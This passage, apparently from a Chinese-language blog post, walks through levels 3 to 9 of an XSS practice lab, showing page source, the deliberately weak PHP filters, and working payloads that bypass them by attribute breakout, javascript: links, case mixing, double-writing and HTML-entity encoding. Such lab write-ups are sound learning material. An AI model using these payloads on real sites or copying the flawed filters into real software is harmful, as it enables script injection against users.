class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:27<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>全都进行了转义，<br>学习了网上的 onfocus事件绕过<br>在不需要&lt;&gt;的情况下完成绕过，大概就是在用户触发onfocus时会调用 onfocus&#x3D;”myFuncuntion()” 里的myFuncuntion,但是面对未知源码的网站我们不知道有什么确切的函数<br>所以使用JavaScript伪协议进行绕过，<br>JavaScript 协议（javascript:）是一种特殊的 URL 协议，用于在浏览器中直接执行 JavaScript 代码   </p><p>示例用法：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Hello, World!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>所以构造payload:  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span><span class="hljs-variable constant_">XSS</span><span class="hljs-string">&#x27;) &#x27;</span><br><br>这时候：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;114514&#x27;</span>&gt;<br><br>会变成：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;finish&#x27;</span> onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>) <span class="hljs-string">&#x27;&#x27;</span>&gt;<br><br>这时候点击输入框触发onfocus就能执行<br></code></pre></td></tr></table></figure><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>先查看一下页面源码：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和114514相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114514&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意到与level 3 只是 单引号 变成了 双引号   </p><p>遂构造：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; onfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure><p>完成挑战  </p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>先看一下前端：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和find a way out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>怎么感觉，和上一关一样啊？<br>但是：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和finish<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert(&#x27;xss&#x27;) <span class="hljs-symbol">&amp;quot;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;finish&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:42<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>onfocus 里 on 变成 o_n 了。<br>onfocus<br>去docker里看了一眼源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>依旧没有转义input里的str，那尝试构造：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a href=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以通过大小写绕过on和er的转义：<br>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot; &gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>HIHI<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;&#x27;<br></code></pre></td></tr></table></figure><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>随便填个payload，然后查看页面源码。  </p><p>发现这次是直接吧关键词过滤了，大小写绕不过了；   </p><p>联想到sql注入类似的场景，双写试一下？  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a hrhrefef=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功了，但是点击不了，换一条payload看看呢：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; oonnfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure><p>成功！  </p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这里多了个添加友情连接，大概就是输入插入里面，源码看一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level9.php?keyword=not bad!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level8&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;finish&amp;quot; oonnfocus=javascript:alert(&#x27;xss&#x27;) &amp;quot;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;finish&amp;quot oo_nnfocus=javascr_ipt:alert(&#x27;xss&#x27;) &amp;quot&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:53&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>强制转化为小写并且全部转义。。。    </p><p>忍不住看来网上的wp，说是href会自动编译自己链接里的unioncode，  </p><p>但🈶又问了一下ai：  </p><p><strong>在 HTML 中，href 属性本身不会“编译” Unicode，但浏览器在解析 HTML 和处理 URL 时，会按照标准对 Unicode 字符进行编码和解码。这可能会让你产生“自动编译”的错觉。</strong></p><p>然后🈶又找了一下，发现并不是浏览器解析unioncode的原因，是href会解析html实体的原因  </p><p>能通过将payload编译为html的十进制或十六进制实体来进行绕过：   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><p>这段在赛博厨子里自动识别为：HTML Entity<br>所以说并不是unioncode</p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>上一关的payload就直接被band了。。。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level10.php?keyword=well done!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:101&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>只能去看源码了吗  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span 